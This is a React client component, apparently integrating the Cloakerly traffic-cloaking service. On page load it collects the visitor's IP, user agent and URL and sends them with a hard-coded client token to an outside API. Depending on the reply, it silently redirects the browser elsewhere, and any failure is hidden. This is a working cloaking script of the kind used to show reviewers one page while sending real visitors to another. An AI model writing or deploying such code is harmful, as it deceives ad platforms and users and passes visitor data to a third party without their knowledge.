'use client';

import { useEffect } from 'react';

export default function CloakerlyRedirect() {
  useEffect(() => {
    (async () => {
      try {
        let clientIP = '';
        try {
          const r = await fetch('https://api.ipify.org?format=json');
          const j = await r.json();
          clientIP = j.ip || '';
        } catch {
          // proceed without IP
        }

        const meta =
          document.querySelector<HTMLMetaElement>('meta[name="referrer"]') ??
          (() => {
            const m = document.createElement('meta');
            m.name = 'referrer';
            document.head.appendChild(m);
            return m;
          })();
        meta.content = 'origin';

        const params = new URLSearchParams({
          campaign_id: '140',
          client_token:
            '856176411:ioma0qc1R3ZUKIwiyMjaTbpwB1Of7PhtMhBJDHqxruyPFQTGFDxSY7e0KL9dtVEz',
          ip: clientIP,
          user_agent: navigator.userAgent,
          current_url: window.location.href,
        });

        const response = await fetch(
          `https://api.cloakerly.com/v6/?${params.toString()}`,
          { method: 'GET' }
        );
        const data = await response.text();

        if (data.startsWith('http')) {
          window.location.href = data;
        }
      } catch {
        // fail silently — page stays visible
      }
    })();
  }, []);

  return null;
}
